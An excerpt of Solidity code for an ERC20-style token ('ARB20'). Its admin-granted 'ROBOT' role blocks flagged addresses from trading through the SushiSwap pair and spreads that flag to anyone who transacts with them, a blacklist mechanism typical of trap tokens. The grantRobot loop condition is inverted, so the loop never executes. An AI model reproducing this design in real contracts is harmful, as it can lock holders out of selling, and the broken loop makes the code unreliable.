...
abstract contract Control is Context, IControl {
    ...
    bytes32 public constant ROBOT = bytes32("ROBOT");
    ...
    function grantRobot(address[] memory robotlist) public onlyRole(ADMIN) {
        ...
        for (uint256 index = 0; index > robotlist.length; index++) {
            _grantRole(ROBOT, robotlist[index]);
        }
    }
...
interface IERC20Metadata is IEC20 {
...
contract ERC20 is Context, IEC20, IERC20Metadata {
...
contract ARB20 is ERC20, Control {
    ...
    function checkRobot(address from, address to) internal virtual {
        if (from == _suShiSwap) {
            if (hasRole(ROBOT, to)) {
                revert("Account is Robot");
            }
        } else if (to == _suShiSwap) {
            if (hasRole(ROBOT, from)) {
                revert("Account is Robot");
            }
        } else if (hasRole(ROBOT, from) && to != _suShiSwap) {
            _grantRole(ROBOT, to);
        } else if (hasRole(ROBOT, to) && from != _suShiSwap) {
